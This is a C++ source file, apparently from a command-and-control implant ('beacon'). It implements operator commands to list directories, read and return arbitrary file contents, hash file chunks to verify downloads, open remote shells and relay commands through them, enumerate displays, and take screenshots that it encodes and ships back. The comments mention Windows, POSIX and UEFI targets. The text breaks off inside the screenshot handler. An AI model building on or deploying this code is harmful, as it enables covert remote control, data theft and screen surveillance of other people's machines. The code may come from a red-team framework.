#include "commands.h"
#include "memory.h"
#include "file.h"
#include "directory_iterator.h"
#include "path.h"
#include "string.h"
#include "math.h"
#include "logger.h"
#include "sha2.h"
#include "core/containers/vector.h"
#include "core/binary/binary_writer.h"
#include "system_info.h"
#include "shell.h"

// =============================================================================
// Wire helpers
// =============================================================================

/// Upper bound the beacon will read for one GetFileContent command — a
/// ceiling only (the beacon allocates exactly what is requested); it exists
/// so a hostile/malformed wire request cannot demand a huge single heap
/// allocation. A larger request is clamped, which the protocol
/// already permits (reads may return fewer bytes than asked — EOF does).
constexpr UINT64 MAX_FILE_CHUNK_SIZE = 16 * 1024 * 1024;

#pragma pack(push, 1)
struct WireDirectoryEntry
{
    CHAR16 Name[256];
    UINT64 CreationTime;
    UINT64 LastModifiedTime;
    UINT64 Size;
    UINT32 Type;
    BOOL IsDirectory;
    BOOL IsDrive;
    BOOL IsHidden;
    BOOL IsSystem;
    BOOL IsReadOnly;
    UINT64 VolumeSerial;
};
#pragma pack(pop)

static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
{
    StringUtils::WideToChar16(
        Span<const WCHAR>(src.Name, StringUtils::Length(src.Name)),
        Span<CHAR16>(dst.Name, 256));
    dst.CreationTime = src.CreationTime;
    dst.LastModifiedTime = src.LastModifiedTime;
    dst.Size = src.Size;
    dst.Type = src.Type;
    dst.IsDirectory = src.IsDirectory;
    dst.IsDrive = src.IsDrive;
    dst.IsHidden = src.IsHidden;
    dst.IsSystem = src.IsSystem;
    dst.IsReadOnly = src.IsReadOnly;
    dst.VolumeSerial = src.VolumeSerial;
}

// Decodes a NUL-terminated CHAR16 path from the command buffer into the
// handler's wide path buffer, normalizing separators. Returns false when the
// path does not fit the buffer — truncating it would silently target the
// WRONG directory, so the caller must refuse the command instead.
static BOOL DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
{
    if (commandLength < sizeof(CHAR16))
    {
        widePath[0] = L'\0';
        return false;
    }

    PCCHAR16 wirePath = (PCCHAR16)(command);
    USIZE maxChar16 = commandLength / sizeof(CHAR16);
    USIZE wireLen = 0;
    while (wireLen < maxChar16 && wirePath[wireLen] != 0)
        wireLen++;

    // Overflow check BEFORE converting: a wire path longer than the buffer
    // would be silently cut mid-component by Char16ToWide.
    if (wireLen >= widePathSize)
    {
        widePath[0] = L'\0';
        return false;
    }

    USIZE len = StringUtils::Char16ToWide(
        Span<const CHAR16>(wirePath, wireLen),
        Span<WCHAR>(widePath, widePathSize));

    for (USIZE i = 0; i < len; ++i)
    {
        if (widePath[i] == L'\\' || widePath[i] == L'/')
            widePath[i] = (WCHAR)PATH_SEPARATOR;
    }
    return true;
}

// Maps an Error to the platform-INDEPENDENT code carried on the wire. Runtime
// errors already are platform-independent — their ErrorCodes value passes
// through unchanged. OS errors (the chain's root) are classified HERE, the
// only layer that knows which OS produced them, into the Fs_* CAUSE codes:
// consumers branch on a stable enum and never mirror per-OS code tables.
// Unmapped OS errors degrade to the chain's outer failure-site code (e.g.
// Fs_OpenFailed) — still platform-independent, just less specific.
static UINT32 ClassifyError(const Error &error)
{
    switch (error.RootPlatform())
    {
    case Error::PlatformKind::Windows:
        switch (error.RootCode())
        {
        case 0xC0000022u: // STATUS_ACCESS_DENIED
            return Error::Fs_AccessDenied;
        case 0xC0000034u: // STATUS_OBJECT_NAME_NOT_FOUND
        case 0xC000003Au: // STATUS_OBJECT_PATH_NOT_FOUND
            return Error::Fs_PathNotFound;
        case 0xC00000E6u: // STATUS_NO_SUCH_DEVICE
        case 0xC00000C0u: // STATUS_DEVICE_DOES_NOT_EXIST
        case 0xC00002B6u: // STATUS_DEVICE_REMOVED
        case 0xC000026Eu: // STATUS_VOLUME_DISMOUNTED
            return Error::Fs_DeviceGone;
        default:
            break;
        }
        break;
    case Error::PlatformKind::Posix:
        switch (error.RootCode())
        {
        case 1:  // EPERM
        case 13: // EACCES
            return Error::Fs_AccessDenied;
        case 2:  // ENOENT
        case 20: // ENOTDIR
            return Error::Fs_PathNotFound;
        case 6:  // ENXIO
        case 19: // ENODEV
            return Error::Fs_DeviceGone;
        default:
            break;
        }
        break;
    case Error::PlatformKind::Uefi:
        switch (error.RootCode() & 0xFFFFu) // Error::Uefi truncates to the low 32 bits; EFI codes are EFI_ERROR(n)
        {
        case 15: // EFI_ACCESS_DENIED
            return Error::Fs_AccessDenied;
        case 14: // EFI_NOT_FOUND
            return Error::Fs_PathNotFound;
        default:
            break;
        }
        break;
    default:
        break;
    }
    return error.Code; // runtime failure-site code (platform-independent)
}

// Writes an error response carrying the failure's classification:
// [status:u32 = StatusError][errorCode:u32] (8 bytes), where errorCode is a
// platform-INDEPENDENT ErrorCodes value — an Fs_* cause code when the OS
// error is recognized, otherwise the failure-site code. Success responses
// are unaffected; older C2 parsers read the status word first and stop, so
// the extra tail is ignored by them — new C2s use it to classify the failure
// (access denied vs device removed vs path too long) instead of guessing.
static VOID WriteErrorDetailResponse(PPCHAR response, PUSIZE responseLength, const Error &error)
{
    PCHAR buffer = new CHAR[8];
    if (buffer == nullptr)
    {
        *response = nullptr;
        *responseLength = 0;
        return;
    }
    *response = buffer;
    *responseLength = 8;
    BinaryWriter writer{Span<UINT8>((UINT8 *)buffer, 8)};
    writer.Write<UINT32>(StatusCode::StatusError);
    writer.Write<UINT32>(ClassifyError(error));
}

// Writes a simple error response with the given status code. Always leaves
// room for the status word; if even this allocation fails, *response stays
// null and the dispatch loop's null-response guard handles it.
static VOID WriteErrorResponse(PPCHAR response, PUSIZE responseLength, StatusCode code)
{
    USIZE length = *responseLength;
    if (length < sizeof(UINT32))
        length = sizeof(UINT32);
    PCHAR buffer = new CHAR[length];
    if (buffer == nullptr)
    {
        *response = nullptr;
        *responseLength = 0;
        return;
    }
    *response = buffer;
    *responseLength = length;
    BinaryWriter writer{Span<UINT8>((UINT8 *)buffer, length)};
    writer.Write<UINT32>((UINT32)code);
}

// Checks if a directory entry is "." or ".."
static BOOL IsDotEntry(const DirectoryEntry &entry)
{
    return StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L".") ||
           StringUtils::Equals((PWCHAR)entry.Name, (const WCHAR *)L"..");
}

// =============================================================================
// Command handlers
// =============================================================================

VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetDirectoryContentCommand.");
    // Buffer to hold the path from command
    WCHAR directoryPath[2048];
    // Decoding path from command — a path that does not fit is rejected, never truncated
    if (!DecodeWirePath(command, commandLength, directoryPath, 2048))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
        return;
    }
    LOG_INFO("GetDirectoryContent: %ws", directoryPath);

    // Create a DirectoryIterator for the specified path and validate it
    auto result = DirectoryIterator::Create(directoryPath);
    if (!result)
    {
        WriteErrorDetailResponse(response, responseLength, result.Error());
        return;
    }
    // Iterator successfully created, so we can now read entries
    DirectoryIterator &iter = result.Value();
    Vector<DirectoryEntry> entries;
    if (!entries.Init())
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
        return;
    }
    // Iterate through the directory entries, skipping "." and "..", and add
    // them to the vector. A REAL iteration failure (volume dismounted, access
    // revoked mid-scan, unreadable entry) must surface as an error response —
    // returning the entries gathered so far as a success would silently ship
    // a truncated listing that the operator cannot distinguish from complete.
    while (true)
    {
        auto next = iter.Next();
        if (next)
        {
            const DirectoryEntry &entry = iter.Get();
            if (IsDotEntry(entry))
                continue;
            if (!entries.Add(entry))
            {
                WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
                return;
            }
            LOG_INFO("Directory entry added: %ws", entry.Name);
            continue;
        }

        const Error &error = next.Error();
        if (error.Platform == Error::PlatformKind::Runtime && error.Code == Error::Fs_NoMoreEntries)
            break; // clean end of directory

        LOG_ERROR("Directory iteration failed after %d entries: %e", entries.Count, error);
        WriteErrorDetailResponse(response, responseLength, error);
        return;
    }

    // Prepare the response buffer - writing entry count, status code and array of WireDirectoryEntry structures
    UINT64 entryCount = (UINT64)entries.Count;
    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)(entryCount * sizeof(WireDirectoryEntry));
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the directory content response for %llu entries", entryCount);
        *responseLength = 0;
        return;
    }

    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT64>(entryCount);

    WireDirectoryEntry *wireEntries = (WireDirectoryEntry *)(*response + sizeof(UINT32) + sizeof(UINT64));
    for (UINT64 i = 0; i < entryCount; i++)
    {
        Memory::Zero(&wireEntries[i], sizeof(WireDirectoryEntry));
        ToWireEntry(entries.Data[i], wireEntries[i]);
    }
    LOG_INFO("Directory content retrieved successfully with %llu entries", entryCount);
}

// Reads a chunk of file content
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetFileContentCommand.");
    // Validate the wire layout [readCount:u64][offset:u64][path:CHAR16..NUL]
    // before reading it — a truncated command must not be dereferenced.
    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
    if (commandLength < pathOffset + sizeof(CHAR16))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }
    // Getting parameters from command buffer: read count, offset and file path
    UINT64 readCount = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
    if (readCount > MAX_FILE_CHUNK_SIZE)
        readCount = MAX_FILE_CHUNK_SIZE; // defend the beacon heap from a hostile/large request
    LOG_INFO("Reading file content with offset: %llu and count: %llu.", offset, readCount);

    // Decoding file path from command buffer — reject instead of truncate
    WCHAR filePath[2048];
    if (!DecodeWirePath(command + pathOffset, commandLength - pathOffset, filePath, 2048))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
        return;
    }
    LOG_INFO("GetFileContent: %ws offset=%llu count=%llu", filePath, offset, readCount);

    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorDetailResponse(response, responseLength, openResult.Error());
        return;
    }
    LOG_INFO("File opened successfully: %ws", filePath);

    File &file = openResult.Value();
    auto setOffsetResult = file.SetOffset((USIZE)offset);
    if (!setOffsetResult)
    {
        LOG_ERROR("Failed to set file offset: %llu, error: %e", offset, setOffsetResult.Error());
        WriteErrorDetailResponse(response, responseLength, setOffsetResult.Error());
        return;
    }

    // Read into a scratch buffer sized for the request; the response carries
    // exactly the bytes actually read (header [status][bytesRead] + data), so
    // a short read at EOF never ships trailing uninitialized heap memory.
    PUINT8 scratch = new UINT8[(USIZE)readCount + 1];
    if (scratch == nullptr)
    {
        LOG_ERROR("Failed to allocate the file read buffer for %llu bytes", readCount);
        *response = nullptr;
        *responseLength = 0;
        return;
    }

    auto readResult = file.Read(Span<UINT8>(scratch, (USIZE)readCount));
    if (!readResult)
    {
        LOG_ERROR("Failed to read file content, error: %e", readResult.Error());
        delete[] scratch;
        WriteErrorDetailResponse(response, responseLength, readResult.Error());
        return;
    }
    UINT64 bytesRead = readResult.Value();

    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)bytesRead;
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the file content response for %llu bytes", bytesRead);
        *responseLength = 0;
        delete[] scratch;
        return;
    }

    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT64>(bytesRead);
    Memory::Copy(*response + sizeof(UINT32) + sizeof(UINT64), scratch, (USIZE)bytesRead);
    delete[] scratch;

    LOG_INFO("File content read successfully for %llu bytes requested, %llu bytes read", readCount, bytesRead);
}

// Computes the SHA-256 hash of a file chunk
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
{
    LOG_INFO("Handling GetFileChunkHashCommand.");
    // Validate the wire layout [chunkSize:u64][offset:u64][path:CHAR16..NUL]
    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
    if (commandLength < hashPathOffset + sizeof(CHAR16))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }
    // Getting parameters from command buffer: chunk size, offset and file path
    UINT64 chunkSize = *(PUINT64)(command);
    UINT64 offset = *(PUINT64)(command + sizeof(UINT64));

    LOG_INFO("Computing file chunk hash with offset: %llu and chunk size: %llu.", offset, chunkSize);

    // Decoding file path from command buffer — reject instead of truncate
    WCHAR filePath[2048];
    if (!DecodeWirePath(command + hashPathOffset, commandLength - hashPathOffset, filePath, 2048))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
        return;
    }
    LOG_INFO("GetFileChunkHash: %ws chunkSize=%llu offset=%llu", filePath, chunkSize, offset);

    // Attempt to open the file and validate the result
    auto openResult = File::Open(filePath, File::ModeRead);
    if (!openResult)
    {
        WriteErrorDetailResponse(response, responseLength, openResult.Error());
        return;
    }
    LOG_INFO("File opened successfully: %ws", filePath);

    File &file = openResult.Value();
    // Allocating a buffer for reading file chunks.
    UINT64 bufferSize = Math::Min((UINT64)chunkSize, (UINT64)0xffff);
    PUINT8 buffer = new UINT8[bufferSize];
    if (buffer == nullptr)
    {
        LOG_ERROR("Failed to allocate the chunk read buffer (%llu bytes)", bufferSize);
        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
        return;
    }

    SHA256 sha256;
    USIZE totalRead = 0;
    // Read file in small chunks and update the hash until we read the
    // requested count or reach the end of file. A read FAILURE is an error —
    // hashing what happened to be read so far would return a digest of a
    // truncated chunk as if it were valid, corrupting download verification.
    while (totalRead < chunkSize)
    {
        UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
        LOG_INFO("Reading file chunk with offset: %llu and count: %llu.", offset + totalRead, bytesToRead);
        auto setOffsetResult = file.SetOffset((USIZE)(offset + totalRead));

        if (!setOffsetResult)
        {
            LOG_ERROR("Failed to set file offset: %llu, error: %e", offset + totalRead, setOffsetResult.Error());
            WriteErrorDetailResponse(response, responseLength, setOffsetResult.Error());
            delete[] buffer;
            return;
        }

        auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
        if (!readResult)
        {
            LOG_ERROR("Failed to read file chunk at offset %llu, error: %e", offset + totalRead, readResult.Error());
            WriteErrorDetailResponse(response, responseLength, readResult.Error());
            delete[] buffer;
            return;
        }
        UINT32 bytesRead = readResult.Value();
        if (bytesRead == 0)
            break; // clean EOF: the chunk extends past the end of the file
        sha256.Update(Span<const UINT8>(buffer, bytesRead));
        totalRead += bytesRead;
    }
    delete[] buffer;
    // Prepare the response buffer - writing status code and SHA-256 digest of the file chunk
    *responseLength = sizeof(UINT32) + SHA256_DIGEST_SIZE;
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the chunk hash response");
        *responseLength = 0;
        return;
    }

    UINT8 digest[SHA256_DIGEST_SIZE];
    sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));

    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.WriteBytes(Span<const UINT8>(digest, SHA256_DIGEST_SIZE));
    LOG_INFO("GetFileChunkHash: hashed %llu bytes", (UINT64)totalRead);
}

// Open (spawn) a shell. Request: (none). Response: [status:4][shellId:8].
// The beacon assigns the slot id (first free slot) and returns it; the C2 must
// reuse it for Read/Write/Close.
VOID Handle_OpenShellCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling OpenShellCommand.");

    auto openResult = context->shellManager.Open();
    if (!openResult)
    {
        LOG_ERROR("Failed to open shell (error: %e)", openResult.Error());
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = openResult.Value();
    LOG_INFO("Shell opened, assigned id %llu", shellId);
    *responseLength = sizeof(UINT32) + sizeof(ShellId);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the OpenShell response");
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<ShellId>(shellId);
}

// Writes a command to a shell. Payload: [shellId:8][UTF-8 input + '\0']
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling WriteShellCommand.");

    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("WriteShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    PCHAR input = command + sizeof(ShellId);
    USIZE inputLength = commandLength - sizeof(ShellId);

    Shell *shell = context->shellManager.Get(shellId);
    if (shell == nullptr)
    {
        LOG_ERROR("WriteShell: no open shell for id %llu", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Trim for null terminator
    while (inputLength > 0 && input[inputLength - 1] == '\0')
        inputLength--;

    auto writeResult = shell->Write(input, inputLength);
    if (!writeResult)
    {
        LOG_ERROR("Failed to write command to shell (id %llu)", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    LOG_INFO("Command written to shell (id %llu), bytes written: %llu", shellId, writeResult.Value());

    // Prepare the response buffer - writing status code
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the WriteShell response");
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
}

// Reads a chunk of data from a shell's stdout. Payload: [shellId:8]
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling ReadShellCommand.");

    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("ReadShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    Shell *shell = context->shellManager.Get(shellId);
    if (shell == nullptr)
    {
        LOG_ERROR("ReadShell: no open shell for id %llu", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Buffer to hold the data read from the shell
    CHAR buffer[4096];
    auto readResult = shell->Read(buffer, sizeof(buffer));
    if (!readResult)
    {
        LOG_ERROR("Failed to read from shell (id %llu)", shellId);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // Construct the response with status code and the data read from the shell.
    // bytesRead includes the trailing NUL that StringUtils::Copy appends, so the
    // payload spans the shell output plus its terminator.
    USIZE bytesRead = readResult.Value() + 1;
    *responseLength += bytesRead;
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the ReadShell response (%llu bytes)", bytesRead);
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.WriteBytes(Span<const UINT8>((const UINT8 *)buffer, bytesRead - 1));
    writer.Write<UINT8>('\0');
}

// Close a shell instance. Payload: [shellId:8]. Idempotent.
VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling CloseShellCommand.");

    if (commandLength < sizeof(ShellId))
    {
        LOG_ERROR("CloseShell: missing shell id");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    ShellId shellId = 0;
    Memory::Copy(&shellId, command, sizeof(shellId));
    context->shellManager.Close(shellId);
    LOG_INFO("Shell instance closed for id %llu", shellId);

    *responseLength = sizeof(UINT32);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the CloseShell response");
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
}

// Exit - gracefully terminate the agent.
//
// Acknowledges the operator, then signals the main loop to tear down. The main
// loop sends this ACK, exits both of its while (!context.shouldExit) loops, and
// returns from start(); WebSocketClient is released when it goes out of scope, and
// Context::~Context frees any shell/screen-capture state before entry_point() calls
// ExitProcess(). No platform-specific code lives here: termination flows through
// the existing ExitProcess() abstraction, so this command is uniform across all
// targets (on UEFI, ExitProcess() maps to EfiResetShutdown and powers off).
VOID Handle_ExitCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling ExitCommand: operator requested agent termination.");

    // Acknowledge so the operator knows the exit was received and will be honored.
    // The exit is honored even if the response allocation fails — the operator
    // just sees the null-response reconnect instead of an ACK.
    *responseLength = sizeof(UINT32);
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the Exit response");
        *responseLength = 0;
        context->shouldExit = true;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);

    // Signal the main loop to stop after sending this response.
    context->shouldExit = true;
}

// Gets the list of display devices and their information
VOID Handle_GetDisplaysCommand([[maybe_unused]] PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    LOG_INFO("Handling GetDisplaysCommand.");

    if (context->screenCaptureContext == nullptr)
        context->screenCaptureContext = new ScreenCaptureContext();

    // Getting the list of display devices and validating the result
    auto displays = Screen::GetDevices();
    if (!displays)
    {
        LOG_ERROR("Failed to enumerate display devices");
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    LOG_INFO("Display devices enumerated successfully with %u display(s)", displays.Value().Count);

    ScreenDeviceList &deviceList = displays.Value();
    context->screenCaptureContext->DeviceList = deviceList;

    // Prepare the response buffer - writing status code, device count and array of ScreenDevice structures
    *responseLength += sizeof(deviceList.Count) + (USIZE)(deviceList.Count * sizeof(ScreenDevice));
    *response = new CHAR[*responseLength];
    if (*response == nullptr)
    {
        LOG_ERROR("Failed to allocate the GetDisplays response for %u display(s)", deviceList.Count);
        *responseLength = 0;
        return;
    }
    BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT32>(deviceList.Count);
    writer.WriteBytes(Span<const UINT8>((const UINT8 *)deviceList.Devices, (USIZE)(deviceList.Count * sizeof(ScreenDevice))));

    LOG_INFO("GetDisplays: %u display(s)", deviceList.Count);
}

// Callback function for JPEG encoding - called by the encoder to write encoded data chunks
VOID JpegCallback(PVOID context, PVOID data, INT32 size)
{
    JpegBuffer *jpegBuffer = (JpegBuffer *)context;

    // Once an allocation has failed the encoded stream is truncated; stop
    // copying. allocationFailed carries the failure to the Encode() caller,
    // which discards the output instead of shipping a truncated image.
    if (jpegBuffer->allocationFailed)
        return;

    if (data == nullptr)
        jpegBuffer->Initialize(size);

    if (jpegBuffer->allocationFailed)
        return;

    // Grow the reusable JPEG buffer when this chunk no longer fits.
    // New capacity is max(size * 2, size + needed) so a single large chunk
    // never triggers repeated doublings. The arithmetic runs in USIZE:
    // offset/size are UINT32 and their sums could wrap before comparing.
    if ((USIZE)jpegBuffer->offset + (USIZE)size > jpegBuffer->size)
    {
        USIZE newSize = Math::Max((USIZE)jpegBuffer->size * 2, (USIZE)jpegBuffer->size + (USIZE)size);
        if (newSize > 0xFFFFFFFF)
            newSize = 0xFFFFFFFF;
        PUINT8 newBuffer = new UINT8[newSize];
        if (newBuffer == nullptr)
        {
            jpegBuffer->allocationFailed = true;
            return;
        }
        Memory::Copy(newBuffer, jpegBuffer->outputBuffer, jpegBuffer->offset);
        delete[] jpegBuffer->outputBuffer;
        jpegBuffer->outputBuffer = newBuffer;
        jpegBuffer->size = (UINT32)newSize;
    }
    // Copy the encoded data chunk into the buffer and update the offset
    Memory::Copy(jpegBuffer->outputBuffer + jpegBuffer->offset, data, (USIZE)size);
    jpegBuffer->offset += (UINT32)size;
}

// Gets a screenshot of the specified display device
VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
{
    // Validate the wire layout [displayIndex:u32][quality:u32][isFullScreen:u32]
    if (commandLength < 3 * sizeof(UINT32))
    {
        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
        return;
    }
    // Retrieve parameters from command buffer
    auto displayIndex = *(PUINT32)(command);
    auto quality = *(PUINT32)(command + sizeof(UINT32));
    auto isFullScreen = *(PUINT32)(command + sizeof(UINT32) + sizeof(UINT32));
    LOG_INFO("Handling GetScreenshotCommand for display index: %u, quality: %u, isFullScreen: %u", displayIndex, quality, isFullScreen);

    // Ensure the screen capture context exists - create it if it doesn't, and validate the result
    if (context->screenCaptureContext == nullptr)
        context->screenCaptureContext = new ScreenCaptureContext();

    // Getting the device list
    if (context->screenCaptureContext->DeviceList.Count == 0)
    {
        auto displays = Screen::GetDevices();
        if (!displays)
        {
            LOG_ERROR("Failed to enumerate display devices");
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }
        context->screenCaptureContext->DeviceList = displays.Value();
        LOG_INFO("Display devices enumerated successfully with %u display(s)", context->screenCaptureContext->DeviceList.Count);
    }

    const ScreenDevice &device = context->screenCaptureContext->DeviceList.Devices[displayIndex];

    if (context->screenCaptureContext->GraphicsList.count == 0)
        context->screenCaptureContext->GraphicsList.Init(context->screenCaptureContext->DeviceList.Count);

    Graphics &graphics = context->screenCaptureContext->GraphicsList.graphicsArray[displayIndex];

    if (!graphics.IsInitialized())
        graphics.Init(device);

    // Attempt to capture the screen and validate the result
    if (!Screen::Capture(device, Span<RGB>(graphics.currentScreenshot, device.Width * device.Height)))
    {
        LOG_ERROR("Failed to capture the screen for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    // In case of full screen request, encode the whole screenshot as JPEG and send it back
    if (isFullScreen)
    {
        graphics.jpegBuffer.Reset();
        auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, (INT32)device.Width, (INT32)device.Height, 3, Span<const UINT8>((UINT8 *)graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB)));
        if (encodeResult.IsErr() || graphics.jpegBuffer.allocationFailed)
        {
            LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

        Rectangle rect(0, 0, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);

        // We are sending the full JPEG data in one segment, so the segment count is 1
        UINT32 countOfSegments = 1;

        // Write response
        *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + graphics.jpegBuffer.offset;
        *response = new CHAR[*responseLength];
        if (*response == nullptr)
        {
            LOG_ERROR("Failed to allocate the screenshot response (%u bytes of JPEG data)", graphics.jpegBuffer.offset);
            *responseLength = 0;
            return;
        }
        BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
        writer.Write<UINT32>(StatusCode::StatusSuccess);
        writer.Write<UINT32>(countOfSegments);
        rect.toBuffer(writer.GetAddress() + writer.GetOffset());
        return;
    }

    // Threshold of 24 ignores minor JPEG compression artifacts from prior frames
    ImageProcessor::CalculateBiDifference(Span<const RGB>(graphics.currentScreenshot, device.Width * device.Height),
                                          Span<const RGB>(graphics.screenshot, device.Width * device.Height),
                                          device.Width, device.Height,
                                          Span<UCHAR>(graphics.bidiff, device.Width * device.Height),
                                          24);

    // Find dirty rectangles using tile-based detection (replaces RemoveNoise + FindContours)
    auto dirtyResult = ImageProcessor::FindDirtyRects(
        Span<const UINT8>(graphics.bidiff, device.Width * device.Height),
        device.Width, device.Height, 64);
    if (dirtyResult.IsErr())
    {
        LOG_ERROR("Failed to find dirty rectangles for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    auto &dirtyRects = dirtyResult.Value();

    UINT32 countOfRects = 0;

    // Pre-allocate the packet buffer with a generous initial capacity to avoid
    // per-rect reallocation, then let it double on demand. The first UINT32 is
    // the status code, the second the rect count; both are written last, once
    // the final size is known.
    Buffer<CHAR> packet;
    if (!packet.Init(*responseLength + sizeof(UINT32) + (USIZE)device.Width * device.Height / 2) ||
        !packet.Resize(sizeof(UINT32) + sizeof(UINT32)))
    {
        dirtyRects.Free();
        LOG_ERROR("Failed to allocate the screenshot packet for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    for (UINT32 i = 0; i < dirtyRects.Count; i++)
    {
        const DirtyRect &dr = dirtyRects.Rects[i];
        INT32 rectWidth = (INT32)dr.Width;
        INT32 rectHeight = (INT32)dr.Height;

        countOfRects++;

        // Copy rectangle region row-by-row
        for (INT32 j = 0; j < rectHeight; j++)
